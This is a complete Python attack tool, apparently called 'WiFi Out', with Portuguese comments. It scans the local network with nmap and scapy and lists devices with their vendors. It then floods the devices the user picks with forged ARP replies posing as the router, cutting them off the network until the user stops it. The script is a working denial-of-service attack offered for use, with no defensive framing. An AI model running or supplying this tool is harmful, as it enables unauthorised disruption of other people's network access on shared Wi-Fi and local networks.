import subprocess
import re
import time
import requests
import threading
import os
from queue import Queue
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list

# Função para limpar a tela
os.system('clear') 

# Exibir o banner com lolcat
def display_banner():
    banner = """
 _     _  ___   _______  ___     _______  __   __  _______ 
| | _ | ||   | |       ||   |   |       ||  | |  ||       |
| || || ||   | |    ___||   |   |   _   ||  | |  ||_     _|
|       ||   | |   |___ |   |   |  | |  ||  |_|  |  |   |  
|       ||   | |    ___||   |   |  |_|  ||       |  |   |  
|   _   ||   | |   |    |   |   |       ||       |  |   |  
|__| |__||___| |___|    |___|   |_______||_______|  |___|  
by: @MS40GG    """

    
    subprocess.run(["echo", banner], stdout=subprocess.PIPE, text=True)
    subprocess.run(["lolcat"], input=banner, text=True)


# Selecionar interface de rede
def select_network_interface():
    interfaces = get_if_list()
    print(" ")
    print(" ")
    print("Placas de rede disponíveis:")
    for index, interface in enumerate(interfaces):
        print(f"{index + 1}. {interface}")
    choice = int(input("Selecione a placa de rede (número): ")) - 1
    if 0 <= choice < len(interfaces):
        selected_interface = interfaces[choice]
        conf.iface = selected_interface
        print(f"Placa de rede selecionada: {selected_interface}")
        return selected_interface
    else:
        print("Seleção inválida. Saindo...")
        exit()


# Identificar o IP do roteador
def get_router_ip():
    try:
        print("Obtendo o IP do roteador automaticamente...")
        gateway = conf.route.route("0.0.0.0")[2]
        print(f"IP do roteador identificado: {gateway}")
        return gateway
    except Exception as e:
        print(f"Erro ao identificar o IP do roteador: {e}")
        return "192.168.0.1"  # Retorno padrão


# Escanear a rede com Nmap
def scan_with_nmap(target_ip_range):
    print("Escaneando a rede com Nmap, por favor aguarde...")
    result = subprocess.run(
        ["nmap", "-sP", target_ip_range],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    output = result.stdout

    devices = []
    for line in output.split("\n"):
        if "Nmap scan report for" in line:
            ip = line.split()[-1]
            devices.append({'ip': ip, 'mac': None, 'vendor': None})
        elif "MAC Address" in line:
            mac = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", line).group(0)
            if devices:
                devices[-1]['mac'] = mac

    return devices


# Escanear a rede com Scapy
def scan_with_scapy(target_ip_range):
    print("Escaneando a rede com ARP (Scapy)...")
    arp_request = ARP(pdst=target_ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    devices = []
    for element in answered_list:
        devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc, 'vendor': None})
    return devices


# Identificar o fabricante do MAC usando threads
def get_mac_vendor_threaded(mac_addresses):
    def fetch_vendor(mac, result_queue):
        try:
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
            if response.status_code == 200:
                result_queue.put((mac, response.text.strip()))
            else:
                result_queue.put((mac, "Fabricante desconhecido"))
        except Exception:
            result_queue.put((mac, "Erro ao consultar MAC"))

    result_queue = Queue()
    threads = []

    for mac in mac_addresses:
        thread = threading.Thread(target=fetch_vendor, args=(mac, result_queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    vendor_mapping = {}
    while not result_queue.empty():
        mac, vendor = result_queue.get()
        vendor_mapping[mac] = vendor

    return vendor_mapping


# Mesclar resultados de Nmap e Scapy
def merge_results(nmap_devices, scapy_devices):
    devices = {device['ip']: device for device in nmap_devices}

    for scapy_device in scapy_devices:
        if scapy_device['ip'] not in devices:
            devices[scapy_device['ip']] = scapy_device
        elif not devices[scapy_device['ip']]['mac']:
            devices[scapy_device['ip']]['mac'] = scapy_device['mac']

    return list(devices.values())


# Desconectar dispositivos com ARP Spoofing
def disconnect_devices(devices, router_ip):
    packets = []
    for device in devices:
        arp_response = ARP(op=2, pdst=device['ip'], hwdst=device['mac'], psrc=router_ip)
        ether = Ether(dst=device['mac'])
        packet = ether / arp_response
        packets.append(packet)

    print("\nIniciando ataque ARP nos dispositivos selecionados...")
    try:
        while True:
            for packet in packets:
                sendp(packet, verbose=False)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nAtaque ARP interrompido pelo usuário.")


if __name__ == "__main__":
    # Exibir o banner
    display_banner()

    # Selecionar placa de rede
    selected_interface = select_network_interface()

    # Identificar o IP do roteador e o intervalo de IPs
    router_ip = get_router_ip()
    base_ip = ".".join(router_ip.split(".")[:3])
    target_ip_range = f"{base_ip}.1/24"

    # Realizar varreduras
    nmap_devices = scan_with_nmap(target_ip_range)
    scapy_devices = scan_with_scapy(target_ip_range)

    # Combinar os resultados
    combined_devices = merge_results(nmap_devices, scapy_devices)

    # Identificar fabricantes
    mac_addresses = [device['mac'] for device in combined_devices if device['mac']]
    vendor_mapping = get_mac_vendor_threaded(mac_addresses)
    for device in combined_devices:
        if device['mac']:
            device['vendor'] = vendor_mapping.get(device['mac'], "Fabricante desconhecido")

    # Exibir dispositivos encontrados
    print("\nDispositivos encontrados na rede:")
    for index, device in enumerate(combined_devices):
        mac = device['mac'] if device['mac'] else "MAC não encontrado"
        vendor = device['vendor'] if device['vendor'] else "Fabricante desconhecido"
        print(f"{index + 1}. IP: {device['ip']}, MAC: {mac}, Fabricante: {vendor}")

    # Solicitar dispositivos para desconectar
    print("\nDigite os números dos dispositivos que deseja desconectar (separados por vírgula):")
    selected_indexes = input("Seleção: ").split(",")
    selected_devices = [combined_devices[int(index) - 1] for index in selected_indexes if index.isdigit()]

    if selected_devices:
        disconnect_devices(selected_devices, router_ip)
    else:
        print("Nenhum dispositivo válido foi selecionado.")

